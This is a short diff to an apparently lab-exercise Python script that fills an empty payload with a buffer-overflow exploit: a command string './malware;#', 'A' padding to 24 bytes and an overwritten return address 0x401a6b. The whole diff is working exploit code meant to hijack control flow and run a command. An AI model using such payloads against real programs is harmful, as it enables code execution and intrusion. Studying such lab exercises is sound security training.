@@ -4,7 +4,9 @@
 TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
-
-payload = b""
-
-sys.stdout.buffer.write(payload)
+target_addr = 0x401a6b
+cmd = b"./malware;#"
+padding = b"A" * (24 - len(cmd))
+payload = cmd + padding
+payload += target_addr.to_bytes(8, 'little')
+sys.stdout.buffer.write(payload + b"\n")
